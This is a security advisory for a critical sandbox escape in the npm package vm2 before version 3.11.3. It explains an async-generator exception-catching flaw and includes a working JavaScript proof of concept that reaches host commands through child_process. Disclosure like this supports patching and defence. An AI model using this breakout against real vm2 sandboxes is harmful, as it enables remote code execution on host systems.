# [C] vm2 Has a Sandbox Breakout Using Async Generator

## Summary
Severity: Critical
Advisory: GHSA-248r-7h7q-cr24
CVE: CVE-2026-45411
CWE: CWE-668
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-248r-7h7q-cr24
Type: github-advisory

## Affected
- npm: `vm2` — affected >=0 <3.11.3

## Details
### Summary

VM2 suffers from a sandbox breakout vulnerability. This allows attackers to write code which can escape from the VM2 sandbox and execute arbitrary commands on the host system.

### Details

It is possible to catch a host exception using the `yield*` expression inside an async generator. When the generator is closed using the `return` function, the value is awaited on and exceptions thrown in the `then` call will be catched by the runtime and passed to the `yield*` iterator as the next value.

### PoC

```js
const {VM} = require("vm2");
const vm = new VM();
console.log(vm.run(`
class E extends Error {}
function so(d) {
	if (d > 0) so(d-1);
	const e = new E();
	e.stack;
	throw e;
}
async function* helper() {
	yield* {
		[Symbol.asyncIterator]: ()=>({
			next: v=>({value: v, done: false})
		})
	};
}
async function doCatch(f) {
	const i=helper();
	await i.next();
	const v = await i.return({then(r){f();r();}});
	return v.value;
}
(async function f() {
	let min = 0;
	let max = 10000000;
	while (min<max) {
		const mid = (min+max)>>1;
		const e = await doCatch(()=>so(mid));
		if (e.name==="RangeError" && !(e instanceof RangeError)) {
			e.constructor.constructor("return process")().mainModule.require('child_process').execSync('touch pwned');
			return;
		}
		if (e instanceof E) {
			min = mid+1;
		} else {
			max = mid;
		}
	}
})();
`));
```

### Impact

Attackers can perform Remote Code Execution under the assumption that arbitrary code can be executed inside the context of a vm2 sandbox.

## References
- https://github.com/patriksimek/vm2/security/advisories/GHSA-248r-7h7q-cr24
- https://nvd.nist.gov/vuln/detail/CVE-2026-45411
- https://github.com/patriksimek/vm2/commit/093494c0c3ef2390d2e56909f9d56e290e6f18b0
- https://github.com/patriksimek/vm2
- https://github.com/patriksimek/vm2/releases/tag/v3.11.3
